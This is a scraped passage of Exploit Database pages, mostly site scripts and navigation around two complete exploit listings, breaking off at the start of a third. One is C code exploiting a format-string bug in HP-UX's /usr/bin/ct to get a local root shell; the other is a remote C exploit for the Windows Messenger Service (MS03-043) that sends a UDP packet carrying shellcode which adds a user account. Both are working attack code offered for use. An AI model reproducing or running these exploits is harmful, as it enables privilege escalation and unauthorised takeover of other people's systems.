null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 134
HP-UX B11.11 - '/usr/bin/ct' Format String Privilege Escalation - HP-UX local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDHP-UX B11.11 - '/usr/bin/ct' Format String Privilege EscalationEDB-ID:134CVE:2003-0090EDB Verified:Author:watercloudType:localExploit:/Platform:HP-UXDate:2003-12-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/********************************************************************************  File    : x_hp-ux11i_nls_ct.c*  Usage   : cc x_hp-ux11i_nls_ct.c -o x_ct ; ./x_ct*  Purpose : Get a local rootshell from /usr/bin/ct,using HP-UX location language format string bug.*  Author  : watercloud xfocus org*  Tested  : On HP-UX B11.11 .******************************************************************************/#include<stdio.h>#define PATH "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin"#define TERM "TERM=xterm"#define NLSPATH "NLSPATH=/tmp/.ex.cat"#define CMD  "/usr/bin/ct abc_ "#define MSG "\$set 1\n1128 "#define PRT_ARG_NUM 2#define STACK_LEN 0x180#define ENV_BEGIN 0x40#define ENV_LEN   0x40#define LOW_STACK 0x210char buffer[512];char buff[72]="\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08""\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22""\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16""/bin/shA";int * pint = (int *) &buff[56];unsigned int haddr = 0;unsigned int dstaddr = 0;int main(argc,argv,env)int argc;char ** argv;char **env;{unsigned int * pa = (unsigned int*)env;FILE * fp = NULL;int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;int alig1= ENV_BEGIN - xnum*8;int alig2=0;int i=0;while(*pa != NULL)*pa++=0;if(strlen(CMD) >ENV_BEGIN-3){printf("No enough space to alig our env!\n");exit(1);}printf("Exploite for HP-UX 11i NLS format bug by command ct.\n");printf("From watercloud@xfocus.org.  2003-1-4\n");printf("   Site : http://www.xfocus.net (CN).\n");printf("   Site : http://www.xfocus.org (EN).\n");haddr = (unsigned int)&fp & 0xffff0000;if(alig1 < 0)alig1+=0x10000;alig2 = (haddr >> 16) - alig1 -xnum*8 ;if(alig2 < 0)alig2+=0x10000;dstaddr= haddr+ LOW_STACK + STACK_LEN -24;*pint++=dstaddr;*pint++=dstaddr;*pint++=dstaddr;*pint = 0;/* begin to make our .cat file */fp = fopen("/tmp/.ex.k","w");if(fp == NULL){printf("open file : /tmp/.ex.k for write error.\n");exit(1);}fprintf(fp,"%s",MSG);for(;i<xnum;i++)fprintf(fp,"%%.8x");fprintf(fp,"%%.%ix%%n",alig1);fprintf(fp,"%%.%ix%%hn",alig2);fclose(fp);fp = NULL;system("/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k");unlink("/tmp/.ex.k");sprintf(buffer,"TZ=%*s%s%*s",ENV_BEGIN-3-strlen(CMD),"A",buff,ENV_BEGIN+ENV_LEN-strlen(buff),"B");putenv(buffer);putenv(PATH);putenv(TERM);putenv(NLSPATH);printf("¼ÇµÃÉ¾³ýÕâ¸öÁÙÊ±ÎÄ¼þ(Remember to delete the  file): /tmp/.ex.cat .\n");execl("/usr/bin/ct","/usr/bin/ct","abc_",0);   /* ºÃÏ·¿ªÊ¼ÁË £º£©  */}// milw0rm.com [2003-12-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 135
Microsoft Windows Messenger Service (French) - Remote (MS03-043) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Messenger Service (French) - Remote (MS03-043)EDB-ID:135CVE:2003-0717EDB Verified:Author:MrNiceType:remoteExploit:/Platform:WindowsDate:2003-12-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*******************************************************************//*                [Crpt] MS03-043 - Messenger exploit by MrNice [Crpt]                      *//*              ---------------------------------------------------------------                     *//*                                                                                                                  *//*               This Sploit use the unhandledexceptionfilter to redirect                      *//*               the execution. When overflow occur we have :                                   *//*                                                                                                                  *//*               mov 	eax,esi+8		                                                    *//*               mov 	ecx,esi+Ch                                                                     *//*               mov 	dword ptr ds:[ecx],eax                                                     *//*                                                                                                                  *//*               so we control ecx and edx and we can write 4 bytes                            *//*               where we want.                                                                              *//*               If we try to write in a not writable memory zone, an                            *//*               excepetion is lauched and unhandledexceptionfilter too.                     *//*                    						     *//*               A part of unhandledexceptionfilter :                                                 *//*                                                                                                                  *//*              mov	eax, dword_0_77ECF44C(=where)                                      *//*		cmp	eax, ebx				     *//*		jz	short loc_0_77EA734C                                      *//*		push	esi                                                                 *//*		call	eax                                                                *//*							     *//*               So we write the "WHAT"(=jmp esi+4Ch) at                                        *//*               the "WHERE"(=77EA734C here) and when the exception occur             *//*               the unhandledexceptionfilter is lauched so when call eax                    *//*               occur, it execute our code.                                                              *//*                       					                     *//*               Thx Kotik who coded the proof of concept,and Metasploit                    *//*               for Shellcode and last but not least kralor,Scurt from Crpt                   *//*                                                                                                                  *//*               Tested on win2k FR SP0                                                                 *//*                                                                                                                  *//*                                                                                                                  *//*******************************************************************/#ifdef _WIN32#include <winsock.h>#include <windows.h>#pragma comment (lib,"ws2_32")#else#include <sys/types.h>#include <netinet/in.h>#include <sys/socket.h>#include <stdio.h>#include <stdlib.h>#include <arpa/inet.h>#include <netdb.h>#include <sys/timeb.h>#include <string.h>#endifstatic unsigned char packet_header[] ="\x04\x00\x28\x00""\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0""\x4f\xb6\xe6\xfc""\xff\xff\xff\xff""\xff\xff\xff\xff""\xff\xff\xff\xff""\xff\xff\xff\xff""\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00""\x00\x00\xff\xff\xff\xff""\xff\xff\xff\xff""\x00\x00";unsigned char field_header[] ="\xff\xff\xff\xff""\x00\x00\x00\x00""\xff\xff\xff\xff";unsigned char ShellCode[] = // XorDecode	23 bytes"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x3E\x01\x80\x34\x0A\x96\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF"// AddUser:X Pass:X"\xf0\x17\x7a\x16\x96\x1f\x70\x7e\x21\x96\x96\x96\x1f\x90\x1f\x55""\xc5\xfe\xe8\x4e\x74\xe5\x7e\x2b\x96\x96\x96\x1f\xd0\x9a\xc5\xfe""\x18\xd8\x98\x7a\x7e\x39\x96\x96\x96\x1f\xd0\x9e\xa7\x4d\xc5\xfe""\xe6\xff\xa5\xa4\xfe\xf8\xf3\xe2\xf7\xc2\x69\x46\x1f\xd0\x92\x1f""\x55\xc5\xfe\xc8\x49\xea\x5b\x7e\x1a\x96\x96\x96\x1f\xd0\x86\xc5""\xfe\x41\xab\x9a\x55\x7e\xe8\x96\x96\x96\x1f\xd0\x82\xa7\x56\xa7""\x4d\xd5\xc6\xfe\xe4\x96\xe5\x96\xfe\xe2\x96\xf9\x96\xfe\xe4\x96""\xf7\x96\xfe\xe5\x96\xe2\x96\xfe\xf8\x96\xff\x96\xfe\xfb\x96\xff""\x96\xfe\xd7\x96\xf2\x96\x1f\xf0\x8a\xc6\xfe\xce\x96\x96\x96\x1f""\x77\x1f\xd8\x8e\xfe\x96\x96\xca\x96\xc6\xc5\xc6\xc6\xc5\xc6\xc7""\xc7\x1f\x77\xc6\xc2\xc7\xc5\xc6\x69\xc0\x86\x1d\xd8\x8e\xdf\xdf""\xc7\x1f\x77\xfc\x97\xc7\xfc\x95\x69\xe0\x8a\xfc\x96\x69\xc0\x82""\x69\xc0\x9a\xc0\xfc\xa6\xcf\xf2\x1d\x97\x1d\xd6\x9a\x1d\xe6\x8a""\x3b\x1d\xd6\x9e\xc8\x54\x92\x96\xc5\xc3\xc0\xc1\x1d\xfa\xb2\x8e""\x1d\xd3\xaa\x1d\xc2\x93\xee\x97\x7c\x1d\xdc\x8e\x1d\xcc\xb6\x97""\x7d\x75\xa4\xdf\x1d\xa2\x1d\x97\x78\xa7\x69\x6a\xa7\x56\x3a\xae""\x76\xe2\x91\x57\x59\x9b\x97\x51\x7d\x64\xad\xea\xb2\x82\xe3\x77""\x1d\xcc\xb2\x97\x7d\xf0\x1d\x9a\xdd\x1d\xcc\x8a\x97\x7d\x1d\x92""\x1d\x97\x7e\x7d\x94\xa7\x56\x1f\x7c\xc9\xc8\xcb\xcd\x54\x9e\x96";int main(int argc,char *argv[]){int i, packet_size, fields_size, s,sp;unsigned char packet[8192];struct sockaddr_in addr;// A few conditions :// 0 <= strlen(from) + strlen(machine) <= 56// max fields size 3992char from[] = "RECCA";char machine[] = "ZEUS";char body[4096] = "*** MESSAGE ***";#ifdef _WIN32WSADATA wsaData;#endifif(argc<2){printf("\t     [Crpt] MS03-043 - Messenger exploit by MrNice [Crpt]\n");printf("\t\t  www.coromputer.net && Undernet #coromputer\n");printf("---------------------------------------------------------------\n");printf("Tested on Windows 2000 French Sp0\n\n");printf("Downloaded from www.K-OTik.com\n");printf("Syntax : %s <ip>\n",argv[0]);return -1;}#ifdef _WIN32if(WSAStartup(0x101,&wsaData)) {printf("error: unable to load winsock.\n");return -1;}#endifmemset(&addr,0x00,sizeof(addr));addr.sin_family = AF_INET;addr.sin_addr.s_addr = inet_addr(argv[1]);addr.sin_port = htons(135);memset(packet,0x00,sizeof(packet));packet_size = 0;memcpy(&packet[packet_size], packet_header, sizeof(packet_header) - 1);packet_size += sizeof(packet_header) - 1;i = strlen(from) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], from);packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4i = strlen(machine) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], machine);packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4printf("Max 'body' size (incl. terminal NULL char) =%d\n", 3992 - packet_size + sizeof(packet_header) - sizeof(field_header));memset(body, 0x14, sizeof(body));body[2263]=(char)0x90;body[2264]=(char)0x90;body[2265]=(char)0x90;body[2266]=(char)0x90;body[2267]=(char)0x90;body[2268]=(char)0x90;//jmp 8 bytes plus loingbody[2269]=(char)0xeb;body[2270]=(char)0x08;//WHAT CRYPTSVC.dll Win2k sp0 FRENCHbody[2271]=(char)0x48;body[2272]=(char)0x65;body[2273]=(char)0x87;body[2274]=(char)0x76;//WHERE win2k sp0 FRENCHbody[2275]=(char)0x4C;body[2276]=(char)0xF4;body[2277]=(char)0xEC;body[2278]=(char)0x77;for(i=2279;i<2606;i++)body[i]=ShellCode[i-2279];body[3992 - packet_size + sizeof(packet_header) - sizeof(field_header) - 1] = '\0';i = strlen(body) + 1;*(unsigned int *)(&field_header[0]) = i;*(unsigned int *)(&field_header[8]) = i;memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);packet_size += sizeof(field_header) - 1;strcpy(&packet[packet_size], body);packet_size += i;fields_size = packet_size - (sizeof(packet_header) - 1);*(unsigned int *)(&packet[40]) = time(NULL);*(unsigned int *)(&packet[74]) = fields_size;printf("Total length of strings = %d\nPacket size = %d\nFields size = %d\n", strlen(from)+ strlen(machine) + strlen(body), packet_size, fields_size);if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {printf("error: unable to create socket\n");return -1;}if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {printf("error: unable to send packet\n");return -1;}return 0;}// milw0rm.com [2003-12-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 136
Eznet 3.5.0 - Remote Stack Overflow Universal - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: 